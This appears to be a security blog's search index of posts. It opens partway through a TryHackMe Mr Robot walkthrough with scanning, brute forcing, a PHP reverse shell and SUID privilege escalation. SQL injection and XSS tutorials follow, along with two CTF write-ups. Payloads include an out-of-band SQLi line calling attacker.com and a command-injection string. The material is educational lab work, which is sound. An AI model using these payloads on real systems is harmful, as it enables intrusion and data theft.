class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-number">443</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">https</span>   <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">63</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">26.70</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">131086</span> (<span class="hljs-number">5.768</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">22</span> (<span class="hljs-number">964</span><span class="hljs-type">B</span></code></pre><h3 id="Full-NMAP-Scanning"><a href="#Full-NMAP-Scanning" class="headerlink" title="Full NMAP Scanning :"></a>Full NMAP Scanning :</h3><pre><code class="hljs bash">┌──(kali㉿kali)-[~/…/Workspace/TryHackMe/Boxes/mrrobot]└─$ nmap -A -sC -sV -p80,443 10.10.50.127 -PnStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-16 14:07 EDTNmap scan report <span class="hljs-keyword">for</span> 10.10.50.127Host is up (0.063s latency).PORT    STATE SERVICE  VERSION80/tcp  open  http     Apache httpd|_http-server-header: Apache|_http-title: Site doesn<span class="hljs-string">&#x27;t have a title (text/html).</span><span class="hljs-string">443/tcp open  ssl/http Apache httpd</span><span class="hljs-string">| ssl-cert: Subject: commonName=www.example.com</span><span class="hljs-string">| Not valid before: 2015-09-16T10:45:03</span><span class="hljs-string">|_Not valid after:  2025-09-13T10:45:03</span><span class="hljs-string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).|_http-server-header: ApacheService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 18.77 seconds</code></pre><h3 id="Directory-busting"><a href="#Directory-busting" class="headerlink" title="Directory busting :"></a>Directory busting :</h3><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://10.10.50.127 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p><img src="/../images/5.png" alt="alt text"></p><p>First interesting subdomain for me is <code>wp-admin</code> let’s go there :</p><p>Found a Wordpress login :</p><p><img src="/../images/6.png" alt="alt text"></p><p>Tried default admin and password but unfortunately it didnt work . </p><h3 id="Bruteforce-the-username"><a href="#Bruteforce-the-username" class="headerlink" title="Bruteforce the username"></a>Bruteforce the username</h3><p>Open Burpsuite and foxy proxy → Intercept ON → write a random username and pass and hit log in  → Burp intercepts it → Send to Intruder → Add payload to the username → Payloads → Load the list we got <code>fsociety.dic</code> → Check for a username with different length :</p><p><img src="/../images/7.png" alt="alt text"></p><p>If we try a password with the username <code>Elliot</code> the error changes , that tells us the username Elliot is correct :</p><p><img src="/../images/8.png" alt="alt text"></p><p>Let’s head into <code>/license</code> :</p><p><img src="/../images/license.png" alt="alt text"></p><p>Inspect(Q)</p><p><img src="/../images/9.png" alt="alt text"></p><p><img src="/../images/10.png" alt="alt text"></p><p>Username : elliot</p><p>Password : ER28-0652</p><h3 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h3><p>To get shell access we need to paste a php reverse shell into Editor Header:</p><p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a></p><p><img src="/../images/11.png" alt="alt text"></p><p><img src="/../images/12.png" alt="alt text"></p><p>Spawning &#x2F;bin&#x2F;bash using python :</p><p><img src="/../images/13.png" alt="alt text"></p><p>Found a user <code>robot</code> </p><p><img src="/../images/14.png" alt="alt text"></p><p>Crack the hash using <code>Crackstation</code> :</p><p><img src="/../images/15.png" alt="alt text"></p><p>We found <code>robot&#39;s</code> password let’s switch user now </p><p><img src="/../images/16.png" alt="alt text"></p><p><img src="/../images/17.png" alt="alt text"></p><p>Key 2 : <code>abcdefghijklmnopqrstuvwxyz</code></p><h3 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h3><p><code>sudo -l</code></p><p><img src="/../images/18.png" alt="alt text"></p><p><strong>Finding SUID Binaries:</strong></p><pre><code class="hljs bash">robot@linux:~$ find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</code></pre><p><img src="/../images/19.png" alt="alt text"></p><p>Found nmap , let’s go to GTFOBins</p><p><img src="/../images/20.png" alt="alt text"></p><p>Let’s chose option B because its shorter :</p><p><img src="/../images/21.png" alt="alt text"></p><p>Found key 3 : <code>04787ddef27c3dee1ee161b21670b4e4</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
            <tag> Medium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2024/04/10/SQL/"/>
      <url>/2024/04/10/SQL/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/SQLi.webp" alt="alt text"></p><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>SQL injection (SQLi) is a web application injection vulnerability that occurs when an attacker injects malicious SQL statements into an application’s input fields.</p><p>This occurs when a web application does not properly validate user input, allowing an attacker to inject SQL code&#x2F;queries that can manipulate the database or gain access to sensitive information.</p><p>For example, suppose a website has a login form that accepts a username and password. If the website does not properly validate the user’s input, an attacker could enter a malicious SQL statement into the username field that would allow them to bypass the login process and gain access to the website’s database.</p><p>What damage can it do ? </p><p>SQL injection attacks can have serious consequences, including the theft of sensitive data, unauthorized access to sensitive systems, and even full system compromise.</p><h3 id="Types-of-SQL-Injection"><a href="#Types-of-SQL-Injection" class="headerlink" title="Types of SQL Injection:"></a>Types of SQL Injection:</h3><p>SQL injection attacks can manifest in various forms, depending on the specific vulnerability and the attacker’s goals. Some common types of SQL injection include:</p><ol><li><p><code>Classic SQL Injection</code>: In classic SQL injection, attackers insert malicious SQL statements into input fields, such as login forms or search boxes, to manipulate the database. This can involve altering the logic of the original query, extracting sensitive information, or even modifying or deleting database records.</p></li><li><p><code>Blind SQL Injection</code>: In blind SQL injection, attackers exploit vulnerabilities without directly viewing the results of their actions. Instead, they rely on the application’s behavior to infer information indirectly. This can involve techniques like time-based blind injection or boolean-based blind injection.</p></li><li><p><code>Error-based SQL Injection</code>: Error-based SQL injection exploits error messages generated by the database server to extract information about the database structure or the data itself. Attackers inject SQL code that triggers errors revealing details they can exploit.</p></li><li><p><code>Union-based SQL Injection</code>: Union-based SQL injection involves injecting a SELECT statement that includes a UNION operator into an SQL query to combine the results of two queries. This technique can be used to extract data from other tables or even execute arbitrary SQL commands.</p></li><li><p><code>Out-of-Band SQL Injection</code>: Out-of-band SQL injection leverages features of the database server to communicate with the attacker’s server and transmit data. This can be useful when direct retrieval of data is not possible due to network restrictions or other security measures.</p></li><li><p><code>Time-based SQL Injection</code>: Time-based SQL injection involves injecting SQL queries that cause the server to delay its response. Attackers can exploit this delay to infer information indirectly, such as determining whether a certain condition is true or false.</p></li></ol><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples:"></a>Examples:</h2><h3 id="Classic-SQL-Injection"><a href="#Classic-SQL-Injection" class="headerlink" title="Classic SQL Injection:"></a>Classic SQL Injection:</h3><p>Imagine a login form where users input their username and password. An attacker might input ‘ OR 1&#x3D;1 – in the username field. If the application doesn’t properly sanitize inputs, the SQL query might become:</p><pre><code class="hljs powershell"><span class="hljs-built_in">SELECT</span> * FROM users <span class="hljs-built_in">WHERE</span> username = <span class="hljs-string">&#x27;&#x27;</span> OR <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-literal">--</span><span class="hljs-string">&#x27; AND password = &#x27;</span>input_password<span class="hljs-string">&#x27;;</span></code></pre><p>This query always returns true, allowing the attacker to log in without a valid password.</p><h3 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection:"></a>Blind SQL Injection:</h3><p>Suppose there’s a login form on a website where users enter their username and password. The website’s login process checks the entered credentials against a database using an SQL query like this:</p><pre><code class="hljs powershell"><span class="hljs-built_in">SELECT</span> * FROM users <span class="hljs-built_in">WHERE</span> username = <span class="hljs-string">&#x27;input_username&#x27;</span> AND password = <span class="hljs-string">&#x27;input_password&#x27;</span>;</code></pre><p>Now, let’s say an attacker wants to bypass the login and gain unauthorized access to the website’s backend. They notice that the website is vulnerable to Blind SQL Injection. Instead of directly viewing the results of their injected SQL queries, the attacker will rely on the application’s behavior to infer information indirectly.</p><p>The attacker inputs the following string into the username field of the login form:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27; AND SLEEP(10) --&#x27;</span></code></pre><p>If the website takes significantly longer to respond, the attacker infers that the injected condition was true.</p><p>This input modifies the SQL query executed by the application to become:</p><pre><code class="hljs powershell"><span class="hljs-built_in">SELECT</span> * FROM users <span class="hljs-built_in">WHERE</span> username = <span class="hljs-string">&#x27;&#x27;</span> OR <span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">10</span>) <span class="hljs-literal">--</span> <span class="hljs-string">&#x27; AND password = &#x27;</span>input_password<span class="hljs-string">&#x27;;</span></code></pre><h3 id="Error-based-SQL-Injection"><a href="#Error-based-SQL-Injection" class="headerlink" title="Error-based SQL Injection:"></a>Error-based SQL Injection:</h3><p>Consider a website that shows a detailed error message when encountering a database error. An attacker might input:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27; OR 1=1 UNION SELECT 1, @@VERSION --</span></code></pre><p>If the application displays database errors, it might reveal the database version, aiding the attacker.</p><h3 id="Union-based-SQL-Injection"><a href="#Union-based-SQL-Injection" class="headerlink" title="Union-based SQL Injection:"></a>Union-based SQL Injection:</h3><p>Suppose there’s a URL parameter id used in a query like:</p><pre><code class="hljs powershell">http://example.com/page?id=<span class="hljs-number">1</span> UNION <span class="hljs-built_in">SELECT</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-literal">--</span></code></pre><p>If the application concatenates this input into an SQL query without proper validation, it may combine the attacker’s selected columns with the original query’s result.</p><h3 id="Out-of-Band-SQL-Injection"><a href="#Out-of-Band-SQL-Injection" class="headerlink" title="Out-of-Band SQL Injection:"></a>Out-of-Band SQL Injection:</h3><p>If the database server allows outbound connections, an attacker might craft a payload that triggers a DNS lookup or an HTTP request to their controlled server. For example:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27;; EXEC xp_dirtree &#x27;</span>\\attacker.com\share\<span class="hljs-string">&#x27; --</span></code></pre><p>This could trigger a connection to the attacker’s server, revealing information or performing actions.</p><h3 id="Time-based-SQL-Injection"><a href="#Time-based-SQL-Injection" class="headerlink" title="Time-based SQL Injection:"></a>Time-based SQL Injection:</h3><p>Similar to blind SQL injection, but instead of inferring information from response times, an attacker uses queries that introduce delays. For instance:</p><pre><code class="hljs powershell"><span class="hljs-string">&#x27; AND IF(SUBSTRING(database(),1,1)=&#x27;</span>a<span class="hljs-string">&#x27;,SLEEP(10),0) --</span></code></pre><p>If the delay occurs, the attacker deduces that the condition was true.</p><h3 id="SQLi-Remediation"><a href="#SQLi-Remediation" class="headerlink" title="SQLi Remediation :"></a>SQLi Remediation :</h3><ul><li><p>Use parameterized queries or prepared statements.</p></li><li><p>Validate and sanitize user inputs.</p></li><li><p>Limit database user privileges.</p></li><li><p>Conduct regular security audits.</p></li><li><p>Implement web application firewalls (WAFs).</p></li><li><p>Educate developers on secure coding.</p></li><li><p>Monitor and log SQL queries.</p></li><li><p>Keep software updated.</p></li></ul><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>SQL injection (SQLi) remains a critical security threat for web applications, allowing attackers to manipulate databases and compromise sensitive data. Understanding the various types of SQL injection attacks, such as classic, blind, and time-based, is crucial for effective mitigation. Implementing remediation strategies like parameterized queries, input validation, and least privilege principles are essential steps towards bolstering application security. By staying vigilant, educating developers, and regularly auditing code for vulnerabilities, organizations can minimize the risk of SQL injection and safeguard their systems from exploitation.</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cross-Site Scripting (XSS)</title>
      <link href="/2024/04/08/XSS/"/>
      <url>/2024/04/08/XSS/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/XSS.jpg" alt="alt text"></p><h1 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h1><p>Cross-Site scripting (XSS) is a client-side web vulnerability that allows attackers to inject malicious scripts into web pages.</p><p>This vulnerability is typically caused by a lack of input sanitization&#x2F;validation in web applications</p><p>Attackers leverage XSS vulnerabilities to inject malicious code into web applications. Because XSS is a client side vulnerability, these scripts are executed by the victims browser.</p><p>There are 3 types of Cross-Site Scripting(XSS) attacks :</p><ul><li><p>Reflected XSS</p></li><li><p>Stored XSS</p></li><li><p>DOM-Based XSS</p></li></ul><h1 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h1><p>Reflected&#x2F;non-persistent cross-site scripting is the most common form of<br>XSS and involves tricking a victim into clicking a specially crafted link (with an XSS payload) to the vulnerable website.</p><p>When the victim clicks on the link the website includes the XSS payload as part of the response back to the victims browser, where the payload is executed.</p><h3 id="Exemple-of-a-Reflected-XSS-attack"><a href="#Exemple-of-a-Reflected-XSS-attack" class="headerlink" title="Exemple of a Reflected XSS attack:"></a>Exemple of a Reflected XSS attack:</h3><p><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code></p><p>With this test we can also find out if the Web Application has some kind of filtering or not.</p><p>While this serves as just one among various XSS tests, it remains imperative to conduct thorough assessments for comprehensive security evaluation.</p><h1 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h1><p>Stored&#x2F;persistent cross-site scripting is a vulnerability where an attacker is able to inject Javascript code into a web application’s database or source code via an input that is not sanitised.</p><p>For example, if an attacker is able to inject a malicious XSS payload in to a webpage on a website without proper sanitisation  the XSS payload injected in to the webpage will be executed by the browser of anyone that visits that webpage.</p><h3 id="Example-of-a-Stored-XSS-attack"><a href="#Example-of-a-Stored-XSS-attack" class="headerlink" title="Example of a Stored XSS attack:"></a>Example of a Stored XSS attack:</h3><p>Let’s consider a website that allows users to post comments. The website doesn’t properly sanitize user input, so a malicious user could craft a comment containing JavaScript code. For instance:</p><p><code>&lt;script&gt;alert(&#39;Hello, I am a malicious script!&#39;)&lt;/script&gt;</code></p><p><code>If this comment is stored on the server and not properly sanitized, whenever a user visits the page displaying comments, this script will execute in their browser, showing an alert with the message &quot;Hello, I am a malicious script!&quot;. This is a basic example of a Stored XSS attack where the malicious script is stored on the server and executed whenever the compromised page is accessed.</code></p><h1 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM-Based XSS"></a>DOM-Based XSS</h1><p>DOM-Based XSS&#x2F;type-0 XSS is a type of XSS vulnerability that allows an attacker to inject malicious payloads into a webpage by exploiting a weakness in the DOM of the web application.</p><p>A DOM-Based XSS attack involves exploiting a script on the webpage that takes user input and reflects it back to the page without proper sanitisation, the attacker then injects malicious code&#x2F;payloads into the webpage’s DOM by modifying the values of the script’s variables.</p><h3 id="Example-of-a-DOM-Based-XSS-attack"><a href="#Example-of-a-DOM-Based-XSS-attack" class="headerlink" title="Example of a DOM-Based XSS attack:"></a>Example of a DOM-Based XSS attack:</h3><p>Suppose there’s a website with a search feature that dynamically updates the page based on the user’s input without proper sanitization. A malicious user could manipulate the URL parameters like so:</p><p><a href="https://vulnerable-website.com/search?query=%60">https://vulnerable-website.com/search?query=`</a><script>alert('Hello, I am a malicious script!')</script>&#96;</p><p>In this example, the website’s JavaScript code might retrieve the search query from the URL and directly inject it into the page’s DOM without proper sanitization. As a result, the script included in the URL parameter would execute within the context of the page, displaying an alert box with the message <code>Hello, I am a malicious script!</code> (You’ve see it when you clicked on this post :) ).This illustrates how a DOM-based XSS attack can occur entirely on the client-side, manipulating the DOM environment to execute malicious scripts.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>It’s essential for developers and website administrators to implement robust security measures, such as input validation and output encoding, to mitigate the risk of XSS vulnerabilities. By understanding the various forms of XSS attacks and adopting proactive security practices, organizations can better safeguard their web applications and protect users from potential exploitation.</p><hr><h4 id="Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day"><a href="#Thank-you-for-exploring-this-insightful-overview-of-XSS-attacks-Implementing-vigilant-security-measures-is-crucial-in-safeguarding-web-applications-and-ensuring-a-secure-online-environment-for-all-Wishing-you-a-pleasant-and-secure-browsing-experience-Have-a-great-day" class="headerlink" title="Thank you for exploring this insightful overview of XSS attacks. Implementing vigilant security measures is crucial in safeguarding web applications and ensuring a secure online environment for all. Wishing you a pleasant and secure browsing experience. Have a great day!"></a>Thank you for exploring this insightful overview of XSS attacks. Implementing vigilant security measures is crucial in safeguarding web applications and ensuring a secure online environment for all. Wishing you a pleasant and secure browsing experience. Have a great day!</h4><hr>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Injector</title>
      <link href="/2024/04/07/injector/"/>
      <url>/2024/04/07/injector/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/bannner.png" alt="alt text"></p><p>Challange Link Cyber-EDU:<br><a href="https://app.cyber-edu.co/challenges/c2599f90-44a4-11ed-84b2-51fa576b3d4d?tenant=cyberedu">https://app.cyber-edu.co/challenges/c2599f90-44a4-11ed-84b2-51fa576b3d4d?tenant=cyberedu</a></p><h1 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h1><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell.</p><h1 id="Walktrough"><a href="#Walktrough" class="headerlink" title="Walktrough"></a>Walktrough</h1><p>Browse to the IP Addres Given:</p><p><img src="/../images/injection.png" alt="alt text"></p><p>With the help of google we found a command injection to paste <code>(%20%0Acat%20|/bin/cat%20flag.php)</code> :</p><p><img src="/../images/injection2.png" alt="alt text"></p><p>→ View Page Source → We found the flag:<br><code>C0mm4nd_1nj3c5i0n_1s_E4sy</code></p><p><img src="/../images/flag.png" alt="alt text"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> ROCSC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>robots</title>
      <link href="/2024/04/07/robots/"/>
      <url>/2024/04/07/robots/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/robots.png" alt="alt text"></p><p>Challange Link from Cyber-EDU :<br><a href="https://app.cyber-edu.co/challenges/1e37bac0-44a5-11ed-b4d6-0f0819dfa676?tenant=cyberedu">https://app.cyber-edu.co/challenges/1e37bac0-44a5-11ed-b4d6-0f0819dfa676?tenant=cyberedu</a></p><h1 id="Robots-txt"><a href="#Robots-txt" class="headerlink" title="Robots.txt"></a>Robots.txt</h1><p>Robots.txt is a text file webmasters create to instruct web robots (typically search engine robots) how to crawl pages on their website. The robots.txt file is part of the the robots exclusion protocol (REP), a group of web standards that regulate how robots crawl the web, access and index content, and serve that content up to users. The REP also includes directives like meta robots, as well as page-, subdirectory-, or site-wide instructions for how search engines should treat links (such as “follow” or “nofollow”)c</p><h1 id="Walktrough"><a href="#Walktrough" class="headerlink" title="Walktrough"></a>Walktrough</h1><p>First we paste the address we got in our browser and this is what we get :  </p><p><img src="/../images/image.png" alt="alt text"></p><p>With a tool named <code>nuclei</code> we found a directory <code>robots.txt</code> :</p><pre><code class="hljs powershell">└─<span class="hljs-variable">$</span> nuclei <span class="hljs-literal">-u</span> http://<span class="hljs-number">34.159</span>.<span class="hljs-number">76.30</span>:<span class="hljs-number">31714</span>/</code></pre><p>Found:<br><code>[robots-txt-endpoint] [http] [info] http://34.159.76.30:31714/robots.txt</code></p><p>Let’s try to go into <code>/robots.txt</code> :</p><p><img src="/../images/Screenshot%202024-04-07%20at%2010.25.39.png" alt="alt text"></p><p>We found something interesting &#x2F;g00d_old_mus1c.php , if we dig deep and go into that let’s see what we find :</p><p><img src="/../images/Screenshot%202024-04-07%20at%2010.45.13.png" alt="alt text"></p><p>And we got the Flag : <code>CTF&#123;Kr4ftw3rk_4nd_th3_r0b0ts&#125;</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Easy </tag>
            
            <tag> ROCSC </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
